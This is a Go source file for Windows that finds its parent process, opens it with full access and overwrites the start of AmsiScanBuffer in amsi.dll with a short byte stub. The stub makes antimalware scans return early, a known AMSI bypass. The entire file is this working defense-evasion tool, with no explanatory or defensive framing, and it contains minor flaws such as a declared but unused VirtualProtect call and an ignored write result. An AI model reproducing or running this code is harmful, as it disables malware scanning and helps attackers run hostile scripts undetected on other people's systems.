package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"reflect"
	"syscall"
	"unsafe"
)

// Import necessary libraries
var (
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	procCreateToolhelp32W  = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First     = kernel32.NewProc("Process32FirstW")
	procProcess32Next      = kernel32.NewProc("Process32NextW")
	virtualProtect         = kernel32.NewProc("VirtualProtect")
	runtimeType            = reflect.TypeOf(uintptr(0))
	uintptrType            = reflect.TypeOf(uintptr(0))
)

const (
	TH32CS_SNAPPROCESS = 0x00000002 // Snapshot of all processes
	PROCESS_ALL_ACCESS      = 0x1F0FFF
)

// Struct representing process information
type PROCESSENTRY32 struct {
	Size               uint32
	CntUsage           uint32
	th32ProcessID      uint32
	th32DefaultHeapID  uintptr
	th32ModuleID       uint32
	CntThreads         uint32
	th32ParentProcessID uint32
	PcPriClassBase     int32
	dwFlags            uint32
	szExeFile          [260]uint16
}

// Function to get the parent process id of the current process
func getParentPID() (uint32, error) {
	// Create a snapshot of all processes in the system
	snapshot, _, _ := procCreateToolhelp32W.Call(uintptr(TH32CS_SNAPPROCESS), 0)
	if snapshot == 0 {
		return 0, fmt.Errorf("Failed to create process snapshot")
	}
	// Close the snapshot handle when done
	defer windows.CloseHandle(windows.Handle(snapshot))

	// Initialize the PROCESSENTRY32 structure
	var pe32 PROCESSENTRY32
	pe32.Size = uint32(unsafe.Sizeof(pe32))
	// Get the first process in the snapshot.
	ret, _, _ := procProcess32First.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
	if ret == 0 {
		return 0, fmt.Errorf("Failed to get process entry")
	}

	// Iterate through the processes in the snapshot
	for {
		// Check if the current process ID matches the ID of the parent process
		if pe32.th32ProcessID == uint32(syscall.Getpid()) {
			return pe32.th32ParentProcessID, nil
		}
		// Move to the next process in the snapshot
		ret, _, _ = procProcess32Next.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
		if ret == 0 {
			break
		}
	}

	return 0, fmt.Errorf("Parent PID not found")
}

func lookupFuncAddr(moduleName, functionName string) uintptr {
	mod := windows.NewLazySystemDLL(moduleName)
	proc := mod.NewProc(functionName)
	return proc.Addr()
}


func manipulateMemory(parentPID uint32) error {
	// Open the identified parent process
	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, parentPID)
	if err != nil {
		return fmt.Errorf("Error opening process: %v", err)
	}
	defer windows.CloseHandle(handle)

	// Look up function address in the parent process
	amsiAddr := lookupFuncAddr("amsi.dll", "AmsiScanBuffer")

	// Copy bytes to allocated memory in the parent process
	amsiBytes := []byte{0x31, 0xC0, 0xC1, 0xE0, 0x10, 0x66, 0x83, 0xC8, 0x57, 0xC3}
	var nBytesWritten uintptr
	windows.WriteProcessMemory(handle, amsiAddr, &amsiBytes[0], uintptr(len(amsiBytes)), &nBytesWritten)

	return nil
}

func main() {
	parentPID, err := getParentPID()
	if err != nil {
		fmt.Println("Error getting parent PID:", err)
		return
	}

	fmt.Println("Parent PID:", parentPID)

	// Perform patch on parent process
	if err := manipulateMemory(parentPID); err != nil {
		fmt.Println("Error manipulating memory:", err)
		return
	}
}
